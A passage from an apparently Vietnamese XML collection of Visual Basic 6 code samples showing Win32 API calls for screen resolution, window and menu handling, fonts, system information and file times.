            erg = ChangeDisplaySettings(DevM, CDS_UPDATEREGISTRY)
            ScInfo = Y * 2 ^ 16 + X
            'Notify all the windows of the screen resolution change
            SendMessage HWND_BROADCAST, WM_DISPLAYCHANGE, ByVal Bits, ByVal ScInfo
            MsgBox "Everything's ok", vbOKOnly + vbSystemModal, "It worked!"
        Case Else
            MsgBox "Mode not supported", vbOKOnly + vbSystemModal, "Error"
    End Select
End Sub
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim nDC As Long
    'retrieve the screen's resolution
    OldX = Screen.Width / Screen.TwipsPerPixelX
    OldY = Screen.Height / Screen.TwipsPerPixelY
    'Create a device context, compatible with the screen
    nDC = CreateDC("DISPLAY", vbNullString, vbNullString, ByVal 0&amp;)
    'Change the screen's resolution
    ChangeRes 640, 480, GetDeviceCaps(nDC, BITSPIXEL)
End Sub
Private Sub Form_Unload(Cancel As Integer)
    'restore the screen resolution
    ChangeRes OldX, OldY, GetDeviceCaps(nDC, BITSPIXEL)
    'delete our device context
    DeleteDC nDC
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000228</MaVD>
    <NoiDung>Private Declare Function GetSystemMenu Lib "user32" (ByVal hwnd As Long, ByVal bRevert As Long) As Long
Private Declare Function ModifyMenu Lib "user32" Alias "ModifyMenuW" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpString As Long) As Long
Private Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long

Const MF_STRING = &amp;H0&amp;

Private Sub Form_Load()
    Dim hMenu As Long, MenuItem As Long
    hMenu = GetSystemMenu(Me.hwnd, 0)
    
    MenuItem = GetMenuItemID(hMenu, 0)
    ModifyMenu hMenu, MenuItem, MF_STRING, MenuItem, StrPtr(ConvertToUnicode("Kho6i phu5c"))
    
    MenuItem = GetMenuItemID(hMenu, 1)
    ModifyMenu hMenu, MenuItem, MF_STRING, MenuItem, StrPtr(ConvertToUnicode("Di chuye63n"))
    
    MenuItem = GetMenuItemID(hMenu, 2)
    ModifyMenu hMenu, MenuItem, MF_STRING, MenuItem, StrPtr(ConvertToUnicode("Ki1ch co74"))
    
    MenuItem = GetMenuItemID(hMenu, 3)
    ModifyMenu hMenu, MenuItem, MF_STRING, MenuItem, StrPtr(ConvertToUnicode("Thu nho3"))
    
    MenuItem = GetMenuItemID(hMenu, 4)
    ModifyMenu hMenu, MenuItem, MF_STRING, MenuItem, StrPtr(ConvertToUnicode("Pho1ng to"))
    
    MenuItem = GetMenuItemID(hMenu, 6)
    ModifyMenu hMenu, MenuItem, MF_STRING, MenuItem, StrPtr(ConvertToUnicode("Ke61t thu1c"))
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000229</MaVD>
    <NoiDung>Private Declare Function GetVersion Lib "kernel32" () As Long
Public Function GetWinVersion() As String
    Dim Ver As Long, WinVer As Long
    Ver = GetVersion()
    WinVer = Ver And &amp;HFFFF&amp;
    'retrieve the windows version
    GetWinVersion = Format((WinVer Mod 256) + ((WinVer \ 256) / 100), "Fixed")
End Function
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    MsgBox "Windows version: " + GetWinVersion
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000230</MaVD>
    <NoiDung>'example by Donavon Kuhn (Donavon.Kuhn@Nextel.com)
Private Const MAX_COMPUTERNAME_LENGTH As Long = 31
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Sub Form_Load()
    Dim dwLen As Long
    Dim strString As String
    'Create a buffer
    dwLen = MAX_COMPUTERNAME_LENGTH + 1
    strString = String(dwLen, "X")
    'Get the computer name
    GetComputerName strString, dwLen
    'get only the actual data
    strString = Left(strString, dwLen)
    'Show the computer name
    MsgBox strString
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000231</MaVD>
    <NoiDung>Dim MyWeek, MyDay
MyWeek = Array("Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun")
' Return values assume lower bound set to 1 (using Option Base
' statement).
MyDay = MyWeek(2)   ' MyDay contains "Tue".
MyDay = MyWeek(4)   ' MyDay contains "Thu".</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000232</MaVD>
    <NoiDung>' Call a Sub procedure.
Call PrintToDebugWindow("Hello World")   
' The above statement causes control to be passed to the following
' Sub procedure.
Sub PrintToDebugWindow(AnyString)
   Debug.Print AnyString   ' Print to the Immediate window.
End Sub

' Call an intrinsic function. The return value of the function is
' discarded.
Call Shell(AppName, 1)   ' AppName contains the path of the 
      ' executable file.

' Call a Microsoft Windows DLL procedure. The Declare statement must be 
' Private in a Class Module, but not in a standard Module.
Private Declare Sub MessageBeep Lib "User" (ByVal N As Integer)
Sub CallMyDll()
   Call MessageBeep(0)   ' Call Windows DLL procedure.
   MessageBeep 0   ' Call again without Call keyword.
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000233</MaVD>
    <NoiDung>Function GetCommandLine(Optional MaxArgs)
   'Declare variables.
   Dim C, CmdLine, CmdLnLen, InArg, I, NumArgs
   'See if MaxArgs was provided.
   If IsMissing(MaxArgs) Then MaxArgs = 10
   'Make array of the correct size.
   ReDim ArgArray(MaxArgs)
   NumArgs = 0: InArg = False
   'Get command line arguments.
   CmdLine = Command()
   CmdLnLen = Len(CmdLine)
   'Go thru command line one character
   'at a time.
   For I = 1 To CmdLnLen
      C = Mid(CmdLine, I, 1)
      'Test for space or tab.
      If (C &lt;&gt; " " And C &lt;&gt; vbTab) Then
         'Neither space nor tab.
         'Test if already in argument.
         If Not InArg Then
         'New argument begins.
         'Test for too many arguments.
            If NumArgs = MaxArgs Then Exit For
            NumArgs = NumArgs + 1
            InArg = True
         End If
         'Concatenate character to current argument.
         ArgArray(NumArgs) = ArgArray(NumArgs) &amp; C
      Else
         'Found a space or tab.
         'Set InArg flag to False.
         InArg = False
      End If
   Next I
   'Resize array just enough to hold arguments.
   ReDim Preserve ArgArray(NumArgs)
   'Return Array in Function name.
   GetCommandLine = ArgArray()
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000234</MaVD>
    <NoiDung>' Constants are Private by default.
Const MyVar = 459
Const Pi = 3.14

' Declare Public constant. 
Public Const MyString = "HELP"

' Declare Private Integer constant.
Private Const MyInt As Integer = 5

' Declare multiple constants on same line.
Const MyStr = "Hello", MyDouble As Double = 3.4567</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000235</MaVD>
    <NoiDung>' Call CalculateDouble with an error-producing argument.
Sub Test()
   Debug.Print CalculateDouble("345.45robert")
End Sub
' Define CalculateDouble Function procedure.
Function CalculateDouble(Number)
   If IsNumeric(Number) Then
      CalculateDouble = Number * 2   ' Return result.
   Else
      CalculateDouble = CVErr(2001)   ' Return a user-defined error 
   End If   ' number.
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000236</MaVD>
    <NoiDung>'Lấy ngày hiện tại của hệ thống:
Dim MyDate
MyDate = Date   ' MyDate contains the current system date.

'Đặt lại ngày hiện tại cho hệ thống:
Dim MyDate
MyDate = #February 12, 1985#   ' Assign a date.
Date = MyDate   ' Change system date.
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000237</MaVD>
    <NoiDung>' In Microsoft Windows (16-bit):
Declare Sub MessageBeep Lib "User" (ByVal N As Integer)
' Assume SomeBeep is an alias for the procedure name.
Declare Sub MessageBeep Lib "User" Alias "SomeBeep"(ByVal N As Integer)
' Use an ordinal in the Alias clause to call GetWinFlags.
Declare Function GetWinFlags Lib "Kernel" Alias "#132"() As Long

' In 32-bit Microsoft Windows systems, specify the library USER32.DLL,
' rather than USER.DLL. You can use conditional compilation to write
' code that can run on either Win32 or Win16.
#If Win32 Then
   Declare Sub MessageBeep Lib "User32" (ByVal N As Long)
#Else
   Declare Sub MessageBeep Lib "User" (ByVal N As Integer)
#End If</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000238</MaVD>
    <NoiDung>Sub LoadForm(TenForm As String) 
        Dim Frm As Form 
        Set Frm = Forms.Add(TenForm) 
        Load  Frm 
        Frm.Show 
End Sub

Bây giờ chúng ta có thể Load bất kì form nào chúng ta muốn, chỉ cần gọi thủ tục trên và truyền tên form cần load vào OK.

Ví dụ để load form1 và form9 bạn gọi thủ tục: 
LoadForm("Form1") 
LoadForm("Form9") 
còn nếu bạn muốn load nhiều form cùng 1 lúc thì bạn cần nhập các tên vào mảng 1 chiều sau đó dùng vòng lập để load các form theo ý muốn.

Ví dụ:

Dim i As Byte 
Dim mang(1 To 10) As String 
mang(1)="Form1" 
mang(2)="Form2" 
... 
mang(10)="Form10" 
     For i=1 To 10 
           'If i mod 2 =0 then LoadForm(mang(i)) 'Load những form có vị trí chẳn 
            'If i mod 2 &lt;&gt;0 then LoadForm(mang(i)) 'Load những form có vị trí lẻ 
           LoadForm(mang(i)) 'Load tất cả các form 
    Next</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000239</MaVD>
    <NoiDung>Option Explicit

' Khai báo các hằng cần dùng
Const GWL_STYLE = -16
Const WS_MINIMIZEBOX = &amp;H20000
Const WS_MAXIMIZEBOX = &amp;H10000
' Khai báo các hàm API cần gọi
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
' Thủ tục khởi động MDIForm
Private Sub MDIForm_Load()
Dim L As Long
   ' Đọc thông tin Style của MDIForm
   L = GetWindowLong(Me.hwnd, GWL_STYLE)
   ' Xóa bit miêu tả button Minimize
   L = L And Not (WS_MINIMIZEBOX)
   ' Xóa bit miêu tả button Maximize
   L = L And Not (WS_MAXIMIZEBOX)
   ' Thiết lập lại thông tin Style của MDIForm
   L = SetWindowLong(Me.hwnd, GWL_STYLE, L)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000241</MaVD>
    <NoiDung>'Đặt cửa sổ Notepad vào cửa sổ Form hiện hành:
Private Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Private Sub Form_Load()
Dim hNotePad As Long, n As Long
    Me.WindowState = 2
    Shell "c:\windows\notepad.exe"
    hNotePad = FindWindow("Notepad", vbNullString)
    n = SetParent(hNotePad, Me.hWnd)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000242</MaVD>
    <NoiDung>'Cần 2 Form (Form1 và Form2). 1 Command button trên Form1
Private Declare Function BringWindowToTop Lib "user32" (ByVal hwnd As Long) As Long
Private Sub Command1_Click()
    'in form1
    'Set Form2 on top
    BringWindowToTop Form2.hwnd
End Sub
Private Sub Form_Load()
    Form2.Visible = True
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000243</MaVD>
    <NoiDung>Private Declare Function CloseWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Sub Form_Load()
    'Minimize this Window
    CloseWindow Me.hwnd
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000244</MaVD>
    <NoiDung>Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Private Sub Form_Load()
    'KPD-Team 2001
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim bl As Boolean
    'Is the window enabled?
    bl = IsWindowEnabled(Me.hwnd)
    MsgBox "Is the form enabled? " + Str$(bl)
    'Move the window
    MoveWindow Me.hwnd, 0, 0, 200, 200, 1
    'Show the window
    Me.Show
    'Wait 5 seconds
    t = Timer
    Do
        'Show the remaining time in the form's caption
        Me.Caption = 5 - Int(Timer - t)
        DoEvents
    Loop Until Timer &gt; t + 5
    'Destroy the window
    DestroyWindow Me.hwnd
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000245</MaVD>
    <NoiDung>'Thêm vào Form 2 command button
Private Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal fEnable As Long) As Long

Private Sub Command1_Click()
Dim wasEnable As Long
Dim retval As Long
    wasEnable = IsWindowEnabled(Command2.hwnd)
    'Nếu nó disable thì enable nó và ngược lại
    If wasEnable = 0 Then
        retval = EnableWindow(Command2.hwnd, 1)
    Else
        retval = EnableWindow(Command2.hwnd, 0)
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000246</MaVD>
    <NoiDung>'Thêm vào Form 1 Timer
Private Declare Function GetActiveWindow Lib "user32" () As Long
Private Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function TextOut Lib "gdi32" Alias "TextOutA" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal lpString As String, ByVal nCount As Long) As Long

Private Sub Form_Load()
    Timer1.Interval = 100
    Timer1.Enabled = True
End Sub

Private Sub Timer1_Timer()
    'Draw the text to the active window
    TextOut GetWindowDC(GetActiveWindow), 50, 50, "www.caulacbovb.com", 14
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605021321480853</MaVD>
    <NoiDung>Private Declare Function AddFontResource Lib "gdi32" Alias "AddFontResourceA" (ByVal lpFileName As String) As Long
Private Declare Function RemoveFontResource Lib "gdi32" Alias "RemoveFontResourceA" (ByVal lpFileName As String) As Long

'Ten cua Font
Private Const MY_FONT_NAME = "ABC-VBClubFont"

Private Sub Form_Load()
Dim i As Integer, retval As Long
    
    'Khai bao su dung Font voi he thong
    retval = AddFontResource("C:\myFont.fon")
    
    'Khai bao su dung Font
    Me.Font = MY_FONT_NAME
    
    'Danh sach cac Font co trong he thong
    Me.AutoRedraw = True
    For i = 0 To Screen.FontCount - 1
        Me.Print Screen.Fonts(i)
    Next i
End Sub

Private Sub Form_Unload(Cancel As Integer)
Dim retval As Long
    'Go bo Font khoi he thong
    retval = RemoveFontResource("C:\myFont.fon")
    End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605021346340608</MaVD>
    <NoiDung>Private Declare Function IsIconic Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function IsZoomed Lib "user32" (ByVal hwnd As Long) As Long

Private Sub Form_Resize()
    Dim minflag As Long, maxflag As Long
    'Form đang được thu nhỏ?
    minflag = IsIconic(Me.hwnd)
    'Form đang được phóng to?
    maxflag = IsZoomed(Me.hwnd)
    
    If minflag &lt;&gt; 0 Then
        Me.Caption = "Form is minimized"
    ElseIf maxflag &lt;&gt; 0 Then
        Me.Caption = "Form is maxxmized"
    Else
        'Form ở trạng thái mặc định
        Me.Caption = "Form is restoreed"
    End If

End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605021357270279</MaVD>
    <NoiDung>Private Declare Function FlashWindow Lib "user32" (ByVal hWnd As Long, ByVal bInvert As Long) As Long

Private Sub Form_Load()
    Timer1.Interval = 100
End Sub

Private Sub Timer1_Timer()
Dim nReturnValue As Long
    nReturnValue = FlashWindow(Form1.hWnd, True)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605052206331246</MaVD>
    <NoiDung>'in a form
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Me.AutoRedraw = True
    Me.WindowState = 2
    EnumChildWindows GetDesktopWindow, AddressOf EnumChildProc, ByVal 0&amp;
End Sub

'in a module
Declare Function GetDesktopWindow Lib "user32" () As Long
Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Function EnumChildProc(ByVal hwnd As Long, ByVal lParam As Long) As Long
    Dim sSave As String, tLen As Long
    'Get the windowtext length
    tLen = GetWindowTextLength(hwnd)
    If tLen &lt; 200000000 Then
        sSave = Space$(tLen + 1)
        'get the window text
        GetWindowText hwnd, sSave, Len(sSave)
        'remove the last Chr$(0)
        sSave = Left$(sSave, Len(sSave) - 1)
        If sSave &lt;&gt; " Then Form1.Print sSave
    End If
    'continue enumeration
    EnumChildProc = 1
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605052223370797</MaVD>
    <NoiDung>'This Form needs
'1 Button, called 'Command1'

Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

'Declare the API-Functions
Private Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long

Private Sub Command1_Click()
    Dim Rec As RECT
    'Get Left, Right, Top and Bottom of Form1
    GetWindowRect Form1.hwnd, Rec
    'Set Cursor position on X
    SetCursorPos Rec.Right - 15, Rec.Top + 15
End Sub

Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Set the button's caption
    Command1.Caption = "Set Mousecursor on X"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605052231300866</MaVD>
    <NoiDung>'Code by Mahbub (mahbub73@hotmail.com)
'Ví dụ này cần có 2 form,
'mỗi form chứ 1 button tên: 'Command1'
'và 1 module.

'Đọan code cho Form1
Private Sub Command1_Click()
    ' Make the window Form2 the active window for the program.  Note that
    ' this function will not make the window the foreground window if the user is currently
    ' working with a separate program.
    Dim retval As Long  ' return value
    retval = SetActiveWindow(Form2.hwnd)  ' set Form2 as the application's active window
End Sub
Private Sub Form_Load()
    Form2.Show
End Sub

'Đọan code cho Form2
Private Sub Command1_Click()
    Dim retval As Long  ' return value
    retval = SetActiveWindow(Form1.hwnd)  ' set Form1 as the application's active window
End Sub

'Code cho module:
Declare Function SetActiveWindow Lib "user32.dll" (ByVal hwnd As Long) As Long</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605052251560525</MaVD>
    <NoiDung>'Mở 1 cửa sổ sọan thảo Notepad, chạy đọan code sau:

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function SetForegroundWindow Lib "user32" (ByVal hwnd As Long) As Long

Private Sub Form_Load()
    Dim lHandle As Long
    ' "Notepad" là classname của chương trình Notepad
    lHandle = FindWindow("Notepad", vbNullString)
    'Đặt cửa sổ Notepad lên trước
    lHandle = SetForegroundWindow(lHandle)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605052259000765</MaVD>
    <NoiDung>Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long

Private Sub Form_Activate()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim MyStr As String
    'Create a buffer
    MyStr = String(100, Chr$(0))
    'Get the windowtext
    GetWindowText Me.hwnd, MyStr, 100
    'strip the rest of buffer
    MyStr = Left$(MyStr, InStr(MyStr, Chr$(0)) - 1)
    'Triple the window's text
    MyStr = MyStr + MyStr + MyStr
    'Set the new window text
    SetWindowText Me.hwnd, MyStr
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605122346074135</MaVD>
    <NoiDung>'This project needs a Common Dialog box, named CDBox.
'  (To add the Common Dialog Box to your tools menu, go to Project-&gt;Components (or press CTRL-T)
'   and select Microsoft Common Dialog control)
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type

Private Type SYSTEMTIME
    wYear As Integer
    wMonth As Integer
    wDayOfWeek As Integer
    wDay As Integer
    wHour As Integer
    wMinute As Integer
    wSecond As Integer
    wMilliseconds As Integer
End Type

Private Const GENERIC_WRITE = &amp;H40000000
Private Const GENERIC_READ = &amp;H80000000
Private Const OPEN_EXISTING = 3
Private Const FILE_SHARE_READ = &amp;H1
Private Const FILE_SHARE_WRITE = &amp;H2

Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function SetFileTime Lib "kernel32" (ByVal hFile As Long, lpCreationTime As FILETIME, lpLastAccessTime As FILETIME, lpLastWriteTime As FILETIME) As Long
Private Declare Function SystemTimeToFileTime Lib "kernel32" (lpSystemTime As SYSTEMTIME, lpFileTime As FILETIME) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function LocalFileTimeToFileTime Lib "kernel32" (lpLocalFileTime As FILETIME, lpFileTime As FILETIME) As Long
Private Declare Function CompareFileTime Lib "kernel32" (lpFileTime1 As FILETIME, lpFileTime2 As FILETIME) As Long
Private Declare Function GetFileTime Lib "kernel32" (ByVal hFile As Long, lpCreationTime As FILETIME, lpLastAccessTime As FILETIME, lpLastWriteTime As FILETIME) As Long
Private Declare Function FileTimeToLocalFileTime Lib "kernel32" (lpFileTime As FILETIME, lpLocalFileTime As FILETIME) As Long

Private Sub Form_Load()
    'KPD-Team 1998
    Dim m_Date As Date, hFile As Long
    Dim udtFileTime As FILETIME
    Dim udtLocalTime As FILETIME
    Dim udtSystemTime As SYSTEMTIME
    Dim cTime As FILETIME
    Dim aTime As FILETIME
    Dim wTime As FILETIME
    Dim compare_time As Long
    
    'm_Date = Format(Now, "DD-MM-YY")
    m_Date = Now
    
    'Set the dialog's title
    CDBox.DialogTitle = "Choose a file ..."
    'Set the dialog's filter
    CDBox.Filter = "All Files (*.*)|*.*"
    'Show the 'Open File'-dialog
    CDBox.ShowOpen
    
    udtSystemTime.wYear = Year(m_Date)
    udtSystemTime.wMonth = Month(m_Date) - 1    'Cach day 1 thang
    udtSystemTime.wDay = Day(m_Date)
    udtSystemTime.wDayOfWeek = Weekday(m_Date) - 1
    udtSystemTime.wHour = Hour(m_Date)
    udtSystemTime.wMinute = Minute(m_Date)
    udtSystemTime.wSecond = Second(m_Date)
    udtSystemTime.wMilliseconds = 0

    ' convert system time to local time
    SystemTimeToFileTime udtSystemTime, udtLocalTime
    ' convert local time to GMT
    LocalFileTimeToFileTime udtLocalTime, udtFileTime

    ' open the file to get the filehandle
    hFile = CreateFile(CDBox.FileName, GENERIC_WRITE, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&amp;, OPEN_EXISTING, 0, 0)
    
    ' Lay thoi gian tao file
    GetFileTime hFile, cTime, aTime, wTime
    ' So sanh voi thoi gian cach day 1 thang
    compare_time = CompareFileTime(cTime, udtLocalTime)

    If compare_time = -1 Then MsgBox "File duoc tao truoc ngay " &amp; udtSystemTime.wDay &amp; "/" &amp; udtSystemTime.wMonth &amp; "/" &amp; udtSystemTime.wYear
    If compare_time = 0 Then MsgBox "File duoc tao ngay " &amp; udtSystemTime.wDay &amp; "/" &amp; udtSystemTime.wMonth &amp; "/" &amp; udtSystemTime.wYear
    If compare_time = 1 Then MsgBox "File duoc tao sau ngay " &amp; udtSystemTime.wDay &amp; "/" &amp; udtSystemTime.wMonth &amp; "/" &amp; udtSystemTime.wYear
    
    ' change date/time property of the file
    SetFileTime hFile, udtFileTime, udtFileTime, udtFileTime
    ' close the handle
    CloseHandle hFile
    MsgBox "The date of the file '" + CDBox.FileName + "' has been changed to" + Str$(m_Date), vbInformation + vbOKOnly, App.Title
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605130007184275</MaVD>
    <NoiDung>'This program needs a Dialog box, named CDBox
'  (To add the Common Dialog Box to your tools menu, go to Project-&gt;Components (or press CTRL-T)
'   and select Microsoft Common Dialog control)
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Private Type SHFILEOPSTRUCT
    hWnd As Long
    wFunc As Long
    pFrom As String
    pTo As String
    fFlags As Integer
    fAborted As Boolean
    hNameMaps As Long
    sProgress As String
End Type
Private Type SYSTEMTIME
    wYear As Integer
    wMonth As Integer
    wDayOfWeek As Integer
    wDay As Integer
    wHour As Integer
    wMinute As Integer
    wSecond As Integer
    wMilliseconds As Integer
End Type
Private Const GENERIC_WRITE = &amp;H40000000
Private Const OPEN_EXISTING = 3
Private Const FILE_SHARE_READ = &amp;H1
Private Const FILE_SHARE_WRITE = &amp;H2
Private Const FO_DELETE = &amp;H3
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function CreateDirectory Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpPathName As String, lpSecurityAttributes As Long) As Long
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Private Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long
Private Declare Function GetFileTime Lib "kernel32" (ByVal hFile As Long, lpCreationTime As FILETIME, lpLastAccessTime As FILETIME, lpLastWriteTime As FILETIME) As Long
Private Declare Function MoveFile Lib "kernel32" Alias "MoveFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function SHFileOperation Lib "shell32.dll" Alias "SHFileOperationA" (lpFileOp As SHFILEOPSTRUCT) As Long
Private Declare Function FileTimeToSystemTime Lib "kernel32" (lpFileTime As FILETIME, lpSystemTime As SYSTEMTIME) As Long
Private Declare Function FileTimeToLocalFileTime Lib "kernel32" (lpFileTime As FILETIME, lpLocalFileTime As FILETIME) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim lngHandle As Long, SHDirOp As SHFILEOPSTRUCT, lngLong As Long
    Dim Ft1 As FILETIME, Ft2 As FILETIME, SysTime As SYSTEMTIME
    'Set the dialog's title
    CDBox.DialogTitle = "Choose a file ..."
    'Raise an error when the user pressed cancel
    CDBox.CancelError = True
    'Show the 'Open File'-dialog
    CDBox.ShowOpen
    'Tạo thư mục C:\KPD-Team
    CreateDirectory "C:\KPD-Team", ByVal &amp;H0
    'Copy file đã chọn vào thư mục C:\KPD-Team
    CopyFile CDBox.FileName, "C:\KPD-Team\" + CDBox.FileTitle, 0
    'Đổi tên file thành test.kpd
    MoveFile "C:\KPD-Team\" + CDBox.FileTitle, "C:\KPD-Team\test.kpd"
    'Mở file test.kpd để thao tác
    lngHandle = CreateFile("C:\KPD-Team\test.kpd", GENERIC_WRITE, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&amp;, OPEN_EXISTING, 0, 0)
    'Lấy kích thước file
    MsgBox "The size of the selected file is" + Str$(GetFileSize(lngHandle, lngLong)) + " bytes."
    'Lấy thông tin thời gian liên quan đến file
    GetFileTime lngHandle, Ft1, Ft1, Ft2
    'Convert the file time to the local file time
    FileTimeToLocalFileTime Ft2, Ft1
    'Convert the file time to system file time
    FileTimeToSystemTime Ft1, SysTime
    MsgBox "The selected file was created on" + Str$(SysTime.wMonth) + "/" + LTrim(Str$(SysTime.wDay)) + "/" + LTrim(Str$(SysTime.wYear))
    'Đóng file lại, giải phóng tài nguyên
    CloseHandle lngHandle
    'Xóa file C:\KPD-Team\test.kpd
    DeleteFile "C:\KPD-Team\test.kpd"
    With SHDirOp
        .wFunc = FO_DELETE
        .pFrom = "C:\KPD-Team"
    End With
    'Xóa thư mục C:\KPD-Team
    SHFileOperation SHDirOp
    End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605130017350712</MaVD>
    <NoiDung>Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Private Declare Function CopyRect Lib "user32" (lpDestRect As RECT, lpSourceRect As RECT) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim rectWindow As RECT, rectCopy As RECT
    'Get the bounding rectangle of this window
    GetWindowRect Me.hwnd, rectWindow
    'Copy the rectangle
    CopyRect rectCopy, rectWindow
